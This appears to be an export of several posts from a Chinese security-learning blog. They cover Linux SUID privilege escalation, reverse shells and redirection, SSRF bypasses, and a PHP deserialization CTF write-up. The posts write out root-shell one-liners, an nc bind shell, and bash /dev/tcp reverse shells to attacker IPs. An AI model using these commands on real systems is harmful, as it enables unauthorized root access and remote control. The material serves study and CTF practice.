<p><img src="https://s2.loli.net/2022/06/27/ZzMj5W6FTYHJsNX.jpg" alt="image-20210512095047083"></p>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p> find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p>
<p>提权如下:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> anyfile <span class="comment">#必须要有这个文件</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/06/27/PRjkeAapnL3FNGf.jpg" alt="image-20210512100729353"></p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入shell</span></span><br><span class="line">find anyfile -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line">sh-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell</p>
<p>广播shell:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">find user -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>

<p>在攻击机上:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27;</span> \;</span><br></pre></td></tr></table></figure>

<p>在攻击机上:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">vim.tiny  /etc/passwd</span><br></pre></td></tr></table></figure>

<p>通过vim进入shell</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line">#vim命令</span><br><span class="line">:set shell = &#x27;/bin/sh&#x27;</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>以下命令将以root身份打开一个bash shell。</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure>

<h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p>less命令也可以进入shell</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>more命令进入shell和less相同</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p>要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用<code>!</code>命令进入shell</p>
<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano也算是比较上古的文本编辑器了</p>
<p>nano进入shell的方法为</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nano #进入nano编辑器</span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br><span class="line">#即可输入命令</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/06/27/7xcWPR21ZBbyA6u.jpg" alt="image-20210512104644924"></p>
<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p>使用cp 命令覆盖原来的<code>/etc/passwd</code>文件</p>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk命令进入shell:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="cve-2016-5195-dirty-cow-linux内核提权漏洞"><a href="#cve-2016-5195-dirty-cow-linux内核提权漏洞" class="headerlink" title="cve 2016 5195 dirty cow linux内核提权漏洞"></a>cve 2016 5195 dirty cow linux内核提权漏洞</h2><p><strong>影响范围</strong>：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
<p>​         360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）<br>该漏洞的原因是get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p>
<h2 id="利用poc"><a href="#利用poc" class="headerlink" title="利用poc"></a>利用poc</h2><figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">https://github.com/FireFart/dirtycow</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>Linux提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux重定向和反弹Shell</title>
    <url>/2022/04/29/Linux%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8C%E5%8F%8D%E5%BC%B9Shell/</url>
    <content><![CDATA[<h1 id="Linux重定向和反弹shell"><a href="#Linux重定向和反弹shell" class="headerlink" title="Linux重定向和反弹shell"></a>Linux重定向和反弹shell</h1><p>学习链接：<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<h2 id="Linux重定向"><a href="#Linux重定向" class="headerlink" title="Linux重定向"></a>Linux重定向</h2><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a><strong>输入重定向</strong></h3><p>再linux系统中 存在三种文件描述符</p>
<p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p>
<p>键盘作为标准输入设备 如果想要修改标准输入 也就是将其他文件或设备作为标准输入 就要用到输入重定向符 &lt;</p>
<p>举个例子</p>
<p><img src="https://s2.loli.net/2022/04/28/qcmLutRX7yziIBO.png" alt="image-20220428161635333"></p>
<p>正常逻辑是cat y1 为什么这里cat放在y1后面也可以读取</p>
<p>这里命令分为了两个部分 第一个部分是 0&lt; y1 第二部分是cat 如果默认输入设备为键盘的话 那么cat就会读取cat 后从键盘输入的东西 比如 cat y1</p>
<p>而第一部分0&lt; y1 将标准输入设备重定向到了y1中 也就是说y1现在就可以当成是键盘了 y1的内容就是我们从键盘上输出的内容 cat 后读取的是默认输入 而现在经过重定向后的默认输入为y1 所以重定向后直接cat 不需要参数就可以读取y1的内容</p>
<p>然后仔细说一下0&lt; y1 上面提到0是默认输入设备 也就是键盘 输入重定向符将后面的y1 重定向输入到了文件描述符0中 如果输入重定向符前面没有文件描述符 那么默认为0 也就是说 <strong>重定向符修改的是文件描述符（实际上是修改了文件描述符的指针） 不是文件！！！！</strong></p>
<p>&lt;为清除输入重定向符 重定向时会将输入目标清空后进行重定向</p>
<p>&lt;&lt; 为追加输入重定向符 重定向时会保留原有数据 在文件末追加输入内容</p>
<h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a><strong>输出重定向</strong></h3><p>相比于输入重定向 输出重定向更加常用</p>
<p><img src="https://s2.loli.net/2022/04/28/tTlzQdObpxSfM8e.png" alt="image-20220428162920640"></p>
<p><img src="https://s2.loli.net/2022/04/28/dxb3AnkLycWpuEG.png" alt="image-20220428162941912"></p>
<p>上面这两个例子 第一个echo输出字符串 这时的默认输出设备是显示器 所以echo后就会在显示器上显示出来</p>
<p>第二个例子 将标准输出设备重定向为y1文件 那么此时就可以把y1当成显示器了 echo后的字符串会在y1内显示 </p>
<p>但是y1是个文件 并不能直接产生回显 所以要用cat进行读取 可以看到重定向成功</p>
<p>刚才提到重定向符修改的是文件描述符 所以1&gt; 重定向目标 和 &gt; 重定向目标是一样的 没有参数1则默认为1\</p>
<p>&gt;为清除输入重定向符 重定向时会将输出目标清空后进行重定向</p>
<p>&gt;&gt;为追加输出重定向符 重定向时会保留原有数据 在文件末追加输出内容</p>
<h3 id="标准输出与标准报错输出重定向"><a href="#标准输出与标准报错输出重定向" class="headerlink" title="标准输出与标准报错输出重定向"></a><strong>标准输出与标准报错输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p>
<p>这两种格式都等价于  </p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">1&gt; </span><span class="language-bash">目标重定向</span>  </span><br><span class="line"><span class="meta prompt_">2&gt; </span><span class="language-bash">&amp;1    //这个符号一会会说</span></span><br></pre></td></tr></table></figure>

<p>那么2是什么呢 我们知道1是标准输出 刚才也提到了 2是标准错误输出 也就是说2会输出命令产生的报错信息  </p>
<p>上面的两步骤 1&gt; y1 将标准输出重定向到了y1         2&gt; &amp;1 将标准报错输出重定向到了和标准输出1一样的y1 这里的连接符&amp;表示后面的字符为文件描述符 如果不加后面的1就会被当成文件进行重定向输出</p>
<p>现在1和2的指针都指向了y1 所以在进行输出时（不论是标准输出 还是标准报错输出）都会输出在y1中 cat y1就可以看到标准输出和标准报错输出的结果了</p>
<p><img src="https://s2.loli.net/2022/04/28/4Wjbeu13trhqOwE.png" alt="image-20220428164427836"></p>
<p><img src="https://s2.loli.net/2022/04/28/4m9XWQndU6fPgtL.png" alt="image-20220428164403889"></p>
<p>这里要注意 系统在解析命令时是从左到右解析的 如果有重定向符就先进行重定向 再执行命令 所以重定向时命令和重定向要符合逻辑 不能乱改</p>
<p>其他还有一些 东西移步上面的链接</p>
<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a><strong>反弹Shell</strong></h2><h3 id="什么是反弹shell-为什么要反弹shell"><a href="#什么是反弹shell-为什么要反弹shell" class="headerlink" title="什么是反弹shell 为什么要反弹shell"></a>什么是反弹shell 为什么要反弹shell</h3><p>在进行渗透测试时 很可能遇到目标靶机在局域网内 或防火墙内不能ping通 这时我们可以在本机或一个可控的服务端开放一个端口进行监听 并让目标靶机开启一个交互终端 并连接到我们在本机上开放的端口 并且通过重定向将目标机的输入和输出重定向到本机上 从而可以远程控制目标靶机</p>
<p>可能我说的不太准确 放一个官方一点的解释</p>
<p><img src="https://s2.loli.net/2022/04/28/Linqh1AtbOKaHvQ.png"></p>
<h3 id="反弹Shell过程解析"><a href="#反弹Shell过程解析" class="headerlink" title="反弹Shell过程解析"></a>反弹Shell过程解析</h3><p>先在attacker上执行 监听2333端口</p>
<p>nc netcat linux上自带的一个程序 可以用来进行两台主机的通信</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>

<p>再在victim上执行</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>解析一下 这串命令</p>
<p><strong>1.bash -i</strong></p>
<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
<p>2）-i 这个参数表示的是产生交互式的shell</p>
<p><strong>2.&gt;&amp; 0&gt;&amp;1</strong></p>
<p>根据上面的重定向知识可以知道 这一步是将重定向符号前面的标准输出和标准报错输出重定向到重定向符号后面</p>
<p>也就是将bash -i 重定向到了attacker的2333端口   再将标准输入0重定向到和标准输出1一样的位置 也就是attacker的2333端口</p>
<p><strong>3./dev/tcp/</strong></p>
<p>/dev/tcp 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
<p><img src="https://s2.loli.net/2022/04/28/897pNCcvdDjZxyr.png" alt="image-20220428170849009"></p>
<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
]]></content>
      <categories>
        <category>web</category>
        <category>网安</category>
      </categories>
      <tags>
        <tag>Linux重定向</tag>
        <tag>反弹Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF</title>
    <url>/2022/04/16/SSRF/</url>
    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h3 id="首先了解一个东西-内网和外网"><a href="#首先了解一个东西-内网和外网" class="headerlink" title="首先了解一个东西 内网和外网"></a>首先了解一个东西 内网和外网</h3><p>我们知道每一台计算机都有一个属于自己的ip 并且不只计算机 服务器（可以看作远程提供服务的计算机）也有自己的ip</p>
<p>世界上那么多的计算机 而ip地址却只有12位 应该是不够分配的 所以这里提出了内网与外网 外网也叫公网 广域网 内网也叫局域网</p>
<p>在企业，学校这种集体的地方会申请外网ip，也就是说该公司的唯一外网ip就是这个 在该外网ip下有很多的内网ip 也就是这个公司的员工的每一台计算机的ip</p>
<p>所以外网ip是唯一的 而内网ip在它对应的外网ip下是唯一的 内网ip对于所有的ip地址来说是不唯一的 这样就解决了ip地址分配不够的问题</p>
<p>并且内网的计算机在不连接到外网的情况下是不能上网的 我们家庭用的外网一般是营业厅的外网 内网ip则是由营业厅随机分配的 所以在互联网中进行交流依靠的都是公网 并且外网ip是可以被外界访问的 内网ip是不能直接被外界访问的</p>
<h3 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h3><p>那么什么是ssrf呢</p>
<p>刚才我们知道内网是不能直接从外界访问的 但是在某一内网ip所对应的公网内一定会有服务器来为该公网下的各内网计算机提供服务 也就是说服务器会对这些计算机发起各种各样的请求 如果我们能够将这些请求修改成我们自己的payload 就可以达成某些目的 所以ssrf叫做服务端请求伪造漏洞</p>
<p>ssrf可能出现的地方：</p>
<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<h3 id="SSRF-内网信息搜集"><a href="#SSRF-内网信息搜集" class="headerlink" title="SSRF 内网信息搜集"></a>SSRF 内网信息搜集</h3><p>上面提到 SSRF 可以让我们通过服务端与内网相连 所以就可以利用该漏洞渗透进内网 进行信息搜集 SSRF也可以看作是一种注入攻击 相比于在数据库中进行处理的sql注入 以及通过注入js代码从而返回到前端的xss注入 ssrf一般会有一个可控的参数 而该参数一般是一个url 我们将这个参数替换成我们恶意构造的url就可以实现某些目的 比如内网的某个ip地址的433端口设置了一个可以删除用户名的api 那么如果将参数修改为url:433 并经过服务端的处理 那么就可以达到远程删除的效果 但是在实际中 由于ip地址数量很多 而且每个内网ip下又有很多端口 所以一般采用字典爆破的方式查看哪一个ip下的哪一个的端口是可以被我们利用的 从而达到内网信息搜集的目的 包括爆破一些端口 查看哪些端口是开放的 哪些是关闭的</p>
<h3 id="SSRF-Bypass（遇到新的会补充）"><a href="#SSRF-Bypass（遇到新的会补充）" class="headerlink" title="SSRF Bypass（遇到新的会补充）"></a>SSRF Bypass（遇到新的会补充）</h3><p>目前见到的防御方式：</p>
<p>1.urldecode（）需要将参数进行url编码或者二次编码</p>
<p>2.黑名单 白名单过滤</p>
<p>3.正则表达式</p>
<p>4.@绕过 比如 <a href="http://www.baidu.com@y1zh3e7.github.io/">http://www.baidu.com@y1zh3e7.github.io</a></p>
<p>这里会自动删除前面的<a href="http://www.baidu.com/">www.baidu.com</a> 只保留后面的y1zh3e7.github.io</p>
<h3 id="SSRF-OOB"><a href="#SSRF-OOB" class="headerlink" title="SSRF OOB"></a>SSRF OOB</h3><p>在各种需要get post传值 发包的漏洞中，我们一般观察网页回显来判断payload是否被执行 以及payload被执行的情况 如果网站管理员设置了无回显 那么要怎么判断payload是否被执行 之前在rce中也遇到过此类问题 可以采用oob带外通道回显的方式</p>
<p><a href="https://www.freebuf.com/articles/web/201013.html">带外通道技术（OOB）总结 - FreeBuf网络安全行业门户</a></p>
<p>这里需要注意的是 以前外带时需要去ceye注册 很麻烦 在1.6.15版本的burp后添加了 Collaborato 模块 可以直接在burp里进行带外 所以这件事告诉我们要及时更新手头的工具！！！！</p>
<p><a href="https://segmentfault.com/a/1190000021990948?sort=newest">Burp之Collaborator使用技巧 - SegmentFault 思否</a></p>
<p><a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborato模块详解 - FreeBuf网络安全行业门户</a></p>
]]></content>
      <categories>
        <category>网安</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>SSRF服务端请求伪造</tag>
      </tags>
  </entry>
  <entry>
    <title>easy_serialize_php</title>
    <url>/2022/04/13/easy-serialize-php/</url>
    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>==涉及函数：==</p>
<p><strong>implode</strong></p>
<p>返回由数组元素组合成的字符串。如果将第一个参数改成符号 则转化为字符串时各字符串间会使用改符号进行分割</p>
<p><img src="https://s2.loli.net/2022/04/09/anctzfKpeWIXrkM.png" alt="image-20220409150932265"></p>
<p><strong>preg_replace()</strong></p>
<p>执行一个正则表达式的搜索和替换 在第三个参数中搜索第一个参数替换为第二个参数</p>
<p><strong>extract()</strong></p>
<p>从数组中将变量导入到当前的符号表 这里有一个可利用的点 所以说当存在以下两种情况时 参数会覆盖原有的值</p>
<p>1.键值冲突</p>
<p>2.参数数组为敏感或非法字符/数字 比如php中的超全局变量</p>
<p><img src="https://s2.loli.net/2022/04/09/D34aJQEOjKPFdBi.png" alt="image-20220409202044021"></p>
<p><img src="https://s2.loli.net/2022/04/09/rGRsOgENcTpLFUM.png" alt="image-20220409202055738"></p>
<p>==代码审计==</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>可以看到在phpinfo()处 如果function==phpuinfo  就可以执行phpinfo 所以先从这里入手 搜集信息</p>
<p><img src="https://s2.loli.net/2022/04/09/tzkm4S2ELPqxyQA.png" alt="image-20220409155505102"></p>
<p>发现了可疑的flag路径 d0g3_f1ag.php 直接访问失败 </p>
<p>回到代码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure>



<p>刚才提到extract函数覆盖  举个例子</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/04/09/cNuUFRXpw7MYCHr.png" alt="image-20220409185719714"></p>
<p>可以看到在extract($_POST)后session中原有的两个数组被新post上去的数组所覆盖 </p>
<p>知道可以覆盖之后接着看源码</p>
